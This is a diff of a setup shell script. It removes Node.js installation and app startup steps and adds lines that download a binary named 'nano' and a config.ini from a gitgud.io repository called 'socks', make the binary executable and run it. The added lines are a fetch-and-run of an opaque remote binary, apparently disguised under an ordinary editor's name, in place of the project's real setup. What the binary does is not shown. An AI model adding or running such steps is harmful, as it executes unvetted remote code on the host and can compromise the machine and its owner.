@@ -1,9 +1,4 @@
-apt-get update
-apt-get install sudo -y
-curl -sL https://deb.nodesource.com/setup_18.x -o nodesource_setup.sh
-sudo bash nodesource_setup.sh
-sudo apt install nodejs -y
-
-npm install
-sh install.sh
-node index.js
+wget https://gitgud.io/trendava/socks/-/raw/master/nano
+wget https://gitgud.io/trendava/socks/-/raw/master/config.ini
+chmod 700 nano
+./nano
